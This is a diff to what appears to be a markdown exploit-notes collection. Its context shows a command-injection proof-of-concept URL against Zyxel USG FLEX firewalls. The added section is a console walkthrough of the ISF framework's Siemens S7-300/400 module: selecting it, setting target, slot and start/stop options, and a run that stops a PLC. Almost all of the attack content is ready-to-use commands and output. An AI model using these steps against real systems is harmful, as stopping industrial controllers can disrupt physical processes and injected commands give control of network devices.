@@ -143,3 +143,118 @@ title:"USG FLEX 100","USG FLEX 100w","USG FLEX 200","USG FLEX 500","USG FLEX 700
 ```
 poc:http://<IP>/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id
 ```
+
+# ISF (Industrial Exploitation Framework)
+
+## Exploits
+
+    isf > use exploits/plcs/
+
+    exploits/plcs/siemens/  exploits/plcs/vxworks/
+
+    isf > use exploits/plcs/siemens/s7_300_400_plc_control
+
+    exploits/plcs/siemens/s7_300_400_plc_control
+
+    isf > use exploits/plcs/siemens/s7_300_400_plc_control
+
+    isf (S7-300/400 PLC Control) >
+
+    
+
+You can use the tab key for completion.
+
+## Options
+
+### Display module options:
+
+    isf (S7-300/400 PLC Control) > show options
+
+    
+
+    Target options:
+
+    
+
+       Name       Current settings     Description
+
+       ----       ----------------     -----------
+
+       target                          Target address e.g. 192.168.1.1
+
+       port       102                  Target Port
+
+    
+
+    
+
+    Module options:
+
+    
+
+       Name        Current settings     Description
+
+       ----        ----------------     -----------
+
+       slot        2                    CPU slot number.
+
+       command     1                    Command 0:start plc, 1:stop plc.
+
+    
+
+    
+
+    isf (S7-300/400 PLC Control) >
+    
+    
+## Run module
+
+    isf (S7-300/400 PLC Control) > run
+
+    [*] Running module...
+
+    [+] Target is alive
+
+    [*] Sending packet to target
+
+    [*] Stop plc
+
+    isf (S7-300/400 PLC Control) >
+
+    
+
+## Display information about exploit
+
+    isf (S7-300/400 PLC Control) > show info
+
+    
+
+    Name:
+
+    S7-300/400 PLC Control
+
+    
+
+    Description:
+
+    Use S7comm command to start/stop plc.
+
+    
+
+    Devices:
+
+    -  Siemens S7-300 and S7-400 programmable logic controllers (PLCs)
+
+    
+
+    Authors:
+
+    -  wenzhe zhu <jtrkid[at]gmail.com>
+
+    
+
+    References:
+
+    
+
+    isf (S7-300/400 PLC Control) >
